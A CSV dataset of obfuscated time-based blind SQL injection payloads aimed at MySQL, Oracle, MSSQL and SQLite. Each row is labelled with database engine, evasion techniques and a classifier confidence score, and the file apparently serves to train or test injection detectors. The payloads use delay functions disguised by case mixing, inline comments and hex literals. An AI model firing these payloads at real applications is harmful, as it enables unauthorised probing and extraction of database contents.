payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"SElEcT:dBmS_PiPe.RecEivE_mEssAGE ( cHr ( 0o0B0o0o416 ) or cHR< ( 0X10 ) OR chR ( (sElECT (seLeCT 0X48)) ) Or chR ( 0x0xbF ) ,(SELeCT (SeLECT (SeleCt 5))) ) fRom dual and 'fvda'/**/LiKe 'fvDA",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.51,rule,sqliv5_json,unknown
"0b0o1'; ) prOCEDuRe AnaLySE ( ExTrActVAlue OR (SElEct 0X21fc) noT lIKe 0b10010131121100 And TRUe or faLSE OR "" "" nOT likE "" "" AND TRUe Or (sELect (sELect (SELECT 0))) AnD 0x1 AND tRue OR False# ( <(SEleCt (SeLeCt (sElecT 0Xff))),cONCat ( 1x0B2x0x4c, ( BenChmARk ( (seLeCt (SeLect (sElEcT 0x4C4C6c))),md1 (* 0x52595A50 *) ). ) /**/ ) +) /*Fvi*Mrp N'w`-*/,(seLeCT (seLEcT&0x3X1)) &) 'Pk2U",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,string_double_quote
"SeLEcT BENchMarK (] 0X0x4C0o8o4Dfc,MD1b101 ( 1X0o2C4D2102 ?) ) \ && (? ( -( 0O0X0b101001110101 LikE 0b1001011101111",time_blind,mysql,case_variation,0.45,rule,sqliv5_json,unknown
"1%'' =) )/*em*/ ) ` or \(select 0x1d03) += DBMs_pIPe.ReCeivE_MESSAGe ( Chr (=[0o0x0O0B10100105 ) or CHR ( (SElECt (SeLecT (SELECT (SELECT 87)))) ) OR ChR ( 0B0X0b0O5A> ); Or cHr ( 0B0o155 ) ,(SELEcT (SelECt 0O5)) ) or FalSe or FalSe||(sELECT (SELECT 1073)) Not LiKe (sEleCt 0x427) And trUE OR False --",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0"" |) aS wvxt Where 0X1c91=(sElEcT 0X6C95)&And 0b0X3o4416 liKe Dbms_pIPe.rEceiVE_MEsSAge ( chr ( (seLeCt (SELeCt (SElEcT 0X42))) ) ||cHR /*weG (wd. GQL(d [g*/( ?(sElect (seLECT (SeLeCt (seleCt (SeLecT (SELECT 79)))))){ ) oR ChR ""( (sELeCt (selECt (SelECT 191))) ) Or chR ( 0o104 ) ,0x5 ) And 'h'!='hR' aND TRUE or FAlSE OR False --",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SElECT DBMs_piPe.RECEIvE_mESsAge ( chr ( }0X0X49 ) OR cHR' ( (selecT (SELECT (SELECT (SELECT 67)))) ) oR ChR ( 0x63 ) OR ChR ( 0B0O0X52 ) ,(SElEcT 0X5) ) fRoM Dual AND True# gnGa O",time_blind,oracle,case_variation,0.51,rule,sqliv5_json,unknown
"4o6X1|>) +.as NLIG wheRE 0X174c LiKe 0x1310 anD (SeLECT (selECT (seleCt (SELecT (sElECt (sELeCT (Select (SELeCT (SElecT (sEleCt (SELECT 2888)))))))))))=BeNcHmaRK (/*F 0X8 */ 0x4C4b0o60,Md0x5X0O6 ( 0X5D8o1476301 =) ) or (SELEct 0x0X1DBb) NOt lIkE (SelecT 0x15eB) &&= ;8x22f0o4=(Select 1B10581011110190) OR faLSE oR ""Oq+""!=""OQ+""#j[",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,string_double_quote
"wAITfOr dELAY '3b3B0b7X9:(SElEct)0x0b0):5'(And:""LhCV""=""LHCv",time_blind,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"1',WherE=0x5bA9 Like[ 0x9ba8=Or 0X2812?}LiKe* beNchmaRK (\<(SeLeCT%(SELEcT 0o0b0X8d3960)),Md0o6x5/ (?'0o0X0X544D0b0b101a0o0b708c ; ) ; )* & or`""5l""""Like ""0X5Ld""{Or]""_-""=""_-k"":AnD?tRue oR FaLSE and,truE && tRue or (sEleCt (selEcT (SelEcT/*7%&)Qk AND True OR False# @&O}xapp*/0x0)))&anD 0x0o1 oR_FALSe oR+fALSE oR (SeLEcT (SeLEct (SELECT (SELECT 0)))) ANd (sELECT (SELECT 1)) AnD (SeLEct>8790);Not Like 0x2257#or!fALseaNd'N`' Not lIKe |'n`J'#H? 0B0x8]=aXXT0B0O7tQP`v/N>c7",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,string_single_quote
"1""Or (sELECT (SELeCt 0X5B110001000000))=BenChmaRK ( 0b10011004100101101000000,Md5 (> 0O11X794A4745}</) ! ) }(",time_blind,mysql,case_variation,0.45,rule,sqliv5_json,unknown
"0X0b0o1%'/ )? ) And<0X0b100301101100=DBMs_piPe.rEcEIve_MesSAGe ( cHr ""( :0O0b0O4160120 ) OR 'CHR ($*(sElect 0x8F) ) ; oR CHR AnD[TruE OR FaLSE AND`truE# ( (SELect 0x245) / Vwu*/ N*/) , Or cHr) ( (sELECT 0o154) }) ,(selEcT (sELect (SELect (SELECT 5)))) ) Or faLSe Or (SElecT (sELect (sELEct/0x0))) And TruE Or 0X288 NOt liKE:0X155 Or`8 --Ceh.B",time_blind,oracle,case_variation,0.46,rule,sqliv5_json,unknown
"2' WHerE 0O1115=(SELeCt 0x0b1010119B)""oR 0X20C0b0B0 =( LIKe_ ( 'AbcDEfG',UppeR ( hEX ( RANdOMBlOB ( 0x1dCD0x8964/0x2/ ) ) ) )/*&m[a|8IkCN4=~*/ Or { 0x0]or,faLsE oR^0b0o0B0x0 AND[(SeLEcT (select (SelECt (SELect (seLECT (SEleCt (SELecT 5675))))))) not liKE (SELeCT 0x162c) Or (SEleCt (SELECT 0)) Or ~(seLeCt (sElecT 0x5)) or FAlse or FALSE AND '$' NOt LIkE '$N' oR'FalSe oR 0 oR (SELECT (SELECT 0)) --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"SELect LIke ( ^'AbCDefg',uppER ( /*jp>g<*/hEx ( raNdOMblOB ( 0x1dCD0B1100116110015/(sELect (SElecT (SELECT (SELECT (SELECT (SELECT (SELECT 2))))))) ) ) ) ) & ANd ( ( 'kyOs' like 'kyOs",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"0o0X0B0o156 ) ) liKe Or*(sELEct (Select (sElECT 0o0x1C38)))=dBms_PIPe.receiVE_MessAGE ( ;Chr aND ""24""<>""24c""#( 0o640 ;) :oR CHR; ( 3B0B100001191100090101111? )<@ oR cHR ( 0X68 ) oR CHR> (; 6o155 +) ,0b0b1100101: ) --HkL",time_blind,oracle,case_variation|hex_string,0.46,rule,sqliv5_json,string_double_quote
"0' OR (SELECT (sELEcT 0x2118)) Like BeNChMArK ( 0x4C4B0x28,md0B171` (_/*qo h^*/0X9B0X0b1010110110a0b1001010110001, ) . ;) && 'raRu' =/*%.nQuT LhUX0b10110ejRrte5kq7Y*/ 'rArU",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,string_single_quote
"0x1%"" ) and (SeleCT 0O0o0O0x0O0o15222) <= lIkE(/**/( 'ABcdeFg',uPPER ( heX ( RandOMBLOb ({ (SELeCT 0b0b1000111101111010011111011110111000110000100000110001011001000001001010101101100010010100000000)/(seLeCT~(SeLEct (sELEct 9))) | ) ) -) ) AND+ ( /*~o*/""%""+ LIkE """,time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
1' ) WAITFOR DElAY '0O1:(SelecT (select (sELEcT (SElect 4)))):5' AnD( ( 'PEYv'/*WNRf*/lIKe 'PeYv,time_blind,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"0o0O3X5""_ ); ) ) anD 0B110000000070 liKe liKe,)( 'aBcDefG',upPEr (= HEx <( RAnDOmbLOb ( 0o1b0b11000001111100010000100101011011001110100101010110101010110001010001010011110010100101010000000/0b10{ }) ) ) ) +&& ( ( ( ""TkKG"" lIkE| ""tKKG",time_blind,sqlite,,0.53,rule,sqliv5_json,unknown
"9'__) as KHAa Where (SeLEcT|0x0o0X1fDd) {= 0O0x0o3O4x8fB AND (sELEcT_(SELecT 0X954))(= BEnchMARK ( 4X0O4C9960,Md0X6 /?7hXtt{*/3a+ Nl""n?yB*/( 0X6D6O9176744"" ) ) > _ AND tRUE anD'trUE~aNd (sELEct 0XC4d)=(SeLECt (SElEct{(SElEcT (seleCT (SelECT (SELECt 3649))))))<oR 0x0 or fAlSE Or (SELeCT 0)anDtRue And!TruE#R0o0O5B101U TXNg15",time_blind,mysql,case_variation,0.45,rule,sqliv5_json,unknown
"1=) { /*JL/*/){ !; ) /*:*/ ANd 0xEF0O0' LIkE|/*WfT0J0B0o226*/benchMArk(&( 0o4x4C0B100B0b0b11000101010111010,Md0 ( 4X0b100100010101000111111001000/*y?x(~19qf*/ ) ~^) AND / (| {@( *, (! 0b1B1109110091100 .liKe, 0x199c",time_blind,mysql,comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1'+?%( SeLEcT 'QpxK' wheRE (SelECT 0b0x8bE3) LikE 9x1be8x0b0 PRocEdUrE?anAlySe. ( extraCTVALue ]( (SELECT 0O0Xcb7),CoNCat ( 0x5C, ( BENChmARK ( `0B0x0b0X5X4c4b30,md0b901. ( }1O0X0b1X3E88B57b9847Ba57 ) /) "" $ ) ]) ?!) ?,(SELECT (seLECt!(selECt (SeLeCT (seLect (SElect 8O7b0x9)))))) )] )!/*%;?gEC}0x7(*/ +'",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"4%'@ OR <(SeLeCT (SeLeCt (sELect 0x2152))) = BencHmArK ( 0x6C0o6b40,MD5? ( 4x549D5A4C* ) . ) AnD$""3]@"" NOT LikE ""3]@k""~ Or fALse OR fALsE]oR FalsE!Or (SelECT (SeLeCT (SELECT 0))) aNd/*9 */TRuE AND True#O;m#",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"1"" ) ) AND 0b1011011000000\ = bEnCHMArK ( 0o0b1010811111010010111100100,mD3 ( 0X0B100100100000010010101111010 /**/ )/?{*/c.XSbQ*/ ) AND (! ( ""FBol""/*tKht< */ LikE ""fboL",time_blind,mysql,comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,unknown
"6X0b1O1""*or.0b8O0XA0B510001 ~liKe+ DBMs_piPe.ReCEivE_mEsSAGE (/*P+?gKlh)(sELEcT (SELECt 1))^ {]*/ Chr ( (sELECt (sElECT (sElEct (sEleCT{(seleCT 112))))) ) /*t64T*/ oR chr (/*s(J;T}},.4q*/ 0O0B0O3641109 `) oR cHR^ ( (seLEcT 0x41)}+)> oR CHr ([ (SELeCT 0o147) )( ,0b107@ ) anD ""lJKG""/*GOyW*/)= ?""ljKg",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0B5X0b0b0o1"" or (SeLECT (SElECt 0O5111)) Like DbMS_PipE.rECeiVE_mESsAGE ( ChR ( (seLEcT (sEleCT 0X70)) ) oR CHR ( 0X41 ) or cHR ( (SEleCt (SELeCt (SeLEcT (SelEct 65)))) ) or Chr (. 0B6110111 ) ,0x5 )",time_blind,oracle,case_variation,0.46,rule,sqliv5_json,unknown
"0o0O1'/*j RICj*/IN BOolEAn Mode ) OR (SELECT (SELECT 8984))=LiKe ( 'ABcDefg',upPer ( hEX ( RanDOMBlOb (/**/ (sELecT (SeLEcT 0B0b1100000111100011000000111001100100110111111000010101000111100010111100100010010100101110110000000))/(SElECT~(SELecT 0O2))^ ) /*o 4g*/ ) ) ) ~& and truE ?or ' <'/**/NOT?LiKe ' <' anD%0X8145<>0b0B10010001100011010100011101141100001101001010 oR fALsE Or OR 0# (SElecT (SeLEcT-(SELECT (SELECT 0))))# TaOx9/a",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
"9b1' \) aND {[|`0o0x0B0b1001000111010111100111001010110011111111110=DBms_pipe.RECEivE_MeSSaGE ( {CHR- (*\0x4C `) ; oR ChR} (/ 0X0O42/**/ ) or/cHR (. 0x7b0X35 {)/*Mh;P*/ /*&(sELECt 7x0o0b111)mpNoah0p*QnMR2owLV0*/oR cHR ( 0O0b1101011512=*) ,(sEleCT (SELect~0O0x0o5)) )",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0' or 0x1D49 =$ DbMS_pIpe.REceIVE_mESSaGE ( chr ( (SeLecT)(SelEcT (SELecT (sElEct (SELEct (SeLECt (sEleCt 0x11))))))) ) Or CHr/*jv5&l((seleCT 0b10)c?}*/ ( 0b1010115 `) _ or CHR ( 0B1011010 ) Or{CHr [([ 0X9 ) },0b711 ) oR 0X1Fb7 noT lIKe (selecT 0x0B1fb7) OR falsE aNd tRUe oR FaLse AND trUE --",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"SELECT LIKe )( 'aBCdEfG',UPPER ( Hex ( RAndomBLob ( 0B0o0X0b0b1000111101111010011111011110111000110000000000110011000001110001111111101110111010010100000000/0X0B10 ) ) ) ) && ( * ( '%' liKe '",time_blind,sqlite,case_variation|function_alternative,0.53,rule,sqliv5_json,unknown
"1/*U?}o]YTa*/ ) %, ) ?+ ) }aNd/*^ (sELEct (sELecT 0X0B111)) '!^UJGLZ*/0X0o0b1110111010 Like benCHmaRk (< (SelEcT 0x4C4b40),md1X5 $( {0X0b0B0x6ED457154 ; )` )) < \ AnD ]3X22c7<LiKE (selEct (SELECT 0b10071018005100)) && TrUe<Or$fALSE oR FaLSE ANd/**/1 Or FalSE[Or (SElEct 0)#-Z'<<l Zmjxl 8",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0x1' ! )~ ) ? !,) ?or^(SeLECT (SELECt 0O0b0O10X2112))=BeNcHmArK ( 0b0o0X0b0O3c4B1x2c,Md0x0O6O2 ( -0X6x0o0B11111ca5o0X0B6X0O0b0B0B11100101110100011000110100111011010100100101000001101111001100100111101111110111111101011011111100100000010100101101001010011010011001010001100 )+_\/**/)* } + ] AnD ( ~( ! (/*d*n*/ 'Gbhd'^likE 'GBhd",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,unknown
"1%' ]), ) {), or (SElEct?(SELEct 0b0o0B0XeA0b11101110000010001111100101100))?Like BEnCHmarK ( 7x4C4B40,md4o0x0o0O5: ( 0x844D5A4c ; ) ) Or/*0h!f*/FALSe#Lt",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0X2X8b1' WHere 7b0x0b101010A0O2x0x4(]lIKe =(seLECt (SeleCT 0x0X16a5)) And (seLeCt (sElect 0x2078)) Like; DBmS_pipe.RECeivE_MEsSAgE ( CHR""]( ,64'!): OR cHR ( (sELeCT 0X4F) ) ? OR CHR ( 0x0B3107101\@) ; oR chr /( 0x0x29 ) Or 0X3x0 aNd ""?qw"" noT liKe ""^qwl"",aND ""e""=""E"" Or'FalSE or FaLse OR or_FAlse or FALSe:&&|true oR?FalSe OR faLSE Or faLse OR False&&(SELECT 1)# fALseaNDTrUE#,0b801 ) or:fALsE -- 7j5QU_eA-E""-(SElEct (SELECT 0x3))? cqal}",time_blind,oracle,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"0' !)}@ WHere:(SelEct)5x0O1015b)=1X0o1514b; ANd ;4b0XEf0>=:BEnCHMARk ( $(SEleCT (SelecT (SELecT\0X0X4C0B100b45))),MD0X5 /*Q)VoKE\LSj*/(? 0X70559642 /*3Oo(T)GW*/ ) ) "" Or ' Tzg' not lIke ']tZg'.Or fALSe AND 0o0x0X0o1362<>4B0X3b10F0B0B11 OR<FAlsE aNd`2x1~or FAlse And@TRUe AND""0x5x909 <> (seLecT (SElect (sEleCt (SeLecT 0X90A)))) OR faLSE and trUe or FalSe\or;""jl"" <> ""JL""ANDtRUE oR fAlSe ANd TruE or fALse Or faLsE or FalSe AND/**/True --",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,string_double_quote
"0b0B0x1%' ) ) ) or 0o0B0x2112=bEnCHMARK (; (SELECt_(SelECT (sEleCt?0x7C4b0b0b0B160111000101010111000101101101001111111100110010001000))),Md0X2b101 ( 0x0O0O2362A0x0o14B1 ) ) /*|F?NK^?Rz*/ %anD ( ( ( '%'`=>'`$",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"1'+ ( SEleCt JLEY wheRe;0B0o6775 liKE 0xdfd AND 0X0X0B1110111010 = bENchmARK ( (select)0b10011000000101101000600),Md5^\('$0X6D457153 ) ) @> {oR\ 0b10011101100100 nOT lIkE*(seLeCt'0b101x5o4474) (OR FalSE aND ""=""<>""={"" ANd truE aNd TRUE:oR(2x6 ANd[0o13117 nOT lIkE 0b0b1110101101100100010110110010011110110101 aND}1 or 9280<>0o0x2440 Or FalSE#;]_0o11w]zBiilq",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv5_json,unknown
"1"" WHERE 7b0B1001000101100 LiKe )5b0b1110100100010000010000010110010011101100 ANd 0O0X0xC0B1010010 lIkE = (/**/ 'abCDEfg',UPpeR~ ( HEx ( RaNDombLOB ( (SElecT<0B11101110011010110010100000000)/0x0B0b1010 ? ). } ) }) ) aNd TRuE OR 0 AND 'WYv' LIke 'WYv' --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.47,rule,sqliv5_json,string_single_quote
"0o9b110 ), whERe (SelecT (SELEcT (SElECt (seLECT (SeLecT 0X0o11060)))))=(SelECt 0X2298) or (sELeCT 0X0x1B63);LiKE LIKE ( ('aBcDeFg',UppEr_ (< HeX/*\*/ ( raNDoMbloB ( 2X9DCD6508/(SElect 2) +) ) ) [/ ) oR fAlSE AnD 0x0x2B1 && TruE ANd ""} ?"" NOT{ lIKE ""} ?O"" OR (SELEcT 4x0) && (sElEcT 6931)=(seLECt (selEcT 6951)) aND TrUE and 0x1 && tRue Or (seLeCT 0) --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,string_double_quote
"1< ) wHERe (sEleCt (selecT 0X2334)) lIKE '2012!AnD(0xC82 =OR 'iipa' NoT LikE*'iipa' or fALSe: && (seLEct (sElEct 7O12410)) nOT like (SeLECT (sELeCT (SelEct (seleCt (SElECT (SelECt 0o22251)))))) or FaLSE# liKE; ( 'abcdeFg',uPPeR! ( hEX ( raNdombLob ( (SEleCt 3x0Xe8Ab2A0)/9b2x5O0b0o72 ) ) ) < ) /*IT<F*/ AnD 'PB'!='PBj' OR FALse --f{zvHjz]bg",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,string_single_quote
"sELECT;LikE ( 'ABcDEfg',UPPeR -( `hEx (; rAndomBlob ([@0x1dcd0O0x39fc/0b0O123 ) /*zZF*/ ) )~ ) _ && 'FpaF' +NOt Like 'FPAf",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"7o5B0O5"" ) )< ) ;and*2O0O0O3xDFe3 OR faLSE""or FAlse anD trUE or fALse# = DBms_PipE.rECeiVE_mEsSaGe ({ CHr/**/ ( (SElect 0X0o55) ) OR ?CHr ]( (sElect (sELeCt 0X6f)) /*P]0x0x4(Y5+mHw[Gw=<#-]]TK(*/) & Or cHR {( ?(SEleCT 8x65) ) Or<chr (. 0x44: ) ,(SeLecT 0X4) ;) oR {faLsE<--PEgMW9uA",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0o1'!or}(SeleCT-0b0x1ADF) LIKe likE ?( {'aBCdEfg',uPpeR ( HeX/**/<( RandombLOb (/**/ 0b0b1001001000101101101001101011101000001001010100001100000000101000000001111110111101010101010101/0b10 ! ) / )[ { +) % )> and TrUe or/**/0B0O28022 nOT in ((SELeCt 8728),(SelECt (selECT_(sELECt (selECT 0X2212)))),0x2213) And 0X0x15A5 NoT lIke 8614 Or 1347 NOt lIKe 1347 or fALse --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string,0.53,rule,sqliv5_json,in_clause
"0x1"" ) AS RbGl_whEre 0XeEe like (SELeCt 0B111011101110);PrOceDuRe ANaLyse ( ExTRacTVaLUe *( :(sEleCt (seLECT%0xcb7)),conCaT ( $0X5c, [( BEncHMark ( &(SELeCT 0o63045900),Md5 ( 0B7x50515A51 ), &)/*@r*/ ; ):: )~ ) ,(SelECT 0x1) ) OR falsE OR ""j""<>""j"".OR{False OR False OR False --",time_blind,mysql,case_variation|comment_whitespace|inline_comment,0.45,rule,sqliv5_json,unknown
"0B1' ) /*~ m/wIm5U ?bsDF<*/), ) OR+ (sELECt (seLeCt 0x2142)) LiKE bencHmARK ( +0o0o0x4C6a80,md0b101 ( 0x0o1054D0o0b0B101a0B0o144c ) ) AnD truE/ && trUE && trUe oR (SEleCT (SELEcT (SELEct (SeLEct (SEleCt""0))))) AND (SELECT (SELECT 1))#[j+o",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"SeLEcT.lIke ( 'aBcDefG',upper (; hEX ( raNdOmBLob ( 0o0O3563262400/(seLEct (SeLeCT (seLecT)(sEleCT 2)))) ) ) /**/ )^ );> aNd/**/""eJmj"" LIKe ""eJMJ",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,unknown
"1' ) ) aS agdn WheRe 8442 = (SElEcT 8442) AND 3824 LiKe BeNcHmarK ( 0B10011000100101101000000,MD5 ( 0o0o0O0O0x0b0b101001011001101000001010100101101010111010101010110010111100110000101010101100011100010 ) ) --",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv5_json,unknown
"0b1' *) ]aNd/**/(SelecT 0x1O0o50170)=Dbms_piPe.ReCeiVE_MesSagE ( ChR (/*jpb`)*/ (sELeCT (seLEct (SELeCT (selECt (SelecT (SElECt (SEleCt (SELECT (SELECT (SELECT 69))))))))))} ) ||cHR ( 5O0B4x0X4D) ) or cHR ( 0x0B0X0A1d21 ) OR CHr{""( _(sELecT 0x64) }) ,0O5 ) oR (sELECT 0X0) ANd (seleCT 0x1) and/**/trUE --",time_blind,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1%' ) Or FAlSe# ) aNd (seLeCT (SEleCT (SELEct (SelEcT (seLect (SeLECt 0x936)))))) /*zvq4xzgf*/ LikE &^ BEncHmark ( (sElEct (seLecT 0X56F0B2019A1)),mD5 ( 0x0x6d4B0X6F9C1} ) ) #vObI",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0B1'$ ) WhEre (SeleCT 2O0O0B11011100011010)/**/= (SelEcT[0O0X1844)*prOCedure-aNALyse` (. extRaCtVALUE ;(@ 0x0X0X12ef,CoNcAt ( ]0x5C, ( benChmark ( \(SElecT;0X9C9b0X28),md5 ( 1x52515a50` ) ) ! ) ) ) ,0X3o0O0X1 ) oR (SElect (sElECT 515)) lIke (seLecT (SeLEcT (sELEcT|(sElECt (SELECT (SELECT 576)))))) ANd \0x14ba*IN/*s(Qt:;'8*/((selEcT 0x14B9),0X14ba,(SeLEct (sELECT 5307)))\aND trUE OR\faLse aND TrUe AND TrUE{--T1d",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0o1' ) $=) > As JVWq WhErE'(SeleCT.0x4x281) Like, 0X17C4 [&& ' (sEleCT/*0g&Y(2TuM8/SO,s}Sq*/(sELECT (sElECt (SELEcT 0Xc82)))) {=. likE;\(?!'AbCDEFg',UPpER( (*$HEX? ( RANDoMBLoB ( (SeLeCT (seLECt (SElecT<(Select 0x1dcd74a0))))/0X2 ) ) ) & ) oR ;0xB09|Not iN (0Xaf0,0Xb0O23,0O0Xb1A) anD (SEleCT 8b0o17273640567105) Not liKe 0B1B0B1000000110102 aND tRue!AND:0x9f0b0<>5B0X91aA318A18f/*I; AnD (sElEcT+(sELECT 0x0)) and true And TRuE anD (SELECT 3716)<>(SElecT (sElEcT 0xe85))#(SelecT 0x3)@Q*/anD 0x1]ANd (SelECT~(SEleCT (SeLECT (SElect (SeLect 0x1)))))*--Ox!Mr0J]",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string,0.53,rule,sqliv5_json,in_clause
"9'`` ) ), +AS Oocd wHEre:0B0xBad LIKe (sElect 0xb5d) OR (SelecT (sELECt (sELECt (selEcT (SELECT 8584)))))} likE lIkE ( 'ABCDEFg',UpPer ( ;heX ( RANDoMBlob (/**/((selEct (seLECT 0X2X7dcD0o7X6964))/(SELect 0x0X2) ) ) LIKe )_ ) and ""]"" noT liKe/*Y8 wU- M*/""]2O1"" Or (sELEct (SEleCt (SeleCT 0))) oR faLSe OR '[>' not like '[>' --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative,0.53,rule,sqliv5_json,string_single_quote
"0%'^ )) =) or; (seLEct (SeLEcT 0o20746)) LiKE BEnChMaRK ( 0O0O127712574,Md5 ( 2X544d9o5A4C ) ) {aND|true AND'(sEleCt (SelECt (sELECt (SELECt 0X1698))))=0b0o0X1698 oR;FaLsE or 175!=(SEleCt 675) or falSE oR FALse#0z/DT,K",time_blind,mysql,case_variation,0.45,rule,sqliv5_json,unknown
"1%"" Or (SeLeCt 0b10000011000000) LIkE lIke ( 'ABCdefG',uppER ( HeX ( rAndOmBLob ( 0b0b10001000010111001011000101011001100011101101000100101011010111010000111100011110010011010010000/(sELecT 0o0X0B10) ) ) ) ) and!""%""} lIkE """,time_blind,sqlite,case_variation|function_alternative,0.53,rule,sqliv5_json,unknown
"1' iN BoOLean moDE )/**/~ aNd 0Xc82 LiKe LiKe ( |'aBcdEFG',uPpeR ( hEX$ ($ RAnDoMBLOb ( 0O0o0Xa4D0O270242/0X2 ) ) ' ) ) %oR (SELect 1x8d3) Not lIKE 0X1841 oR FaLSe AND 0x524!=(SELECt 6B0x525) oR FaLsE Or (SeLECT (selecT (SeLecT;(SELeCt (SELECt (SeleCt (SELECT (SELECT 0)))))))) AND True#bdL^EbK",time_blind,sqlite,case_variation|comment_whitespace|inline_comment,0.53,rule,sqliv5_json,unknown
"0o0' );; AnD 0o0b111B0b810016007387=like (%-'abCDefg',UPPER~_( +Hex) ( RAndombLOB ( (sELECt (sELect 6o0x0F0o141EBD0o10))/0x0O2. ) /*.""2x5;I05D: OT)~(SeLEct 0o0x4)]2p{<9PGtM7jj;*/ ) > + ) ) ;; aNd/*[dew*/ *( 'xikZ' LIkE''xikz",time_blind,sqlite,case_variation|comment_whitespace|inline_comment,0.53,rule,sqliv5_json,unknown
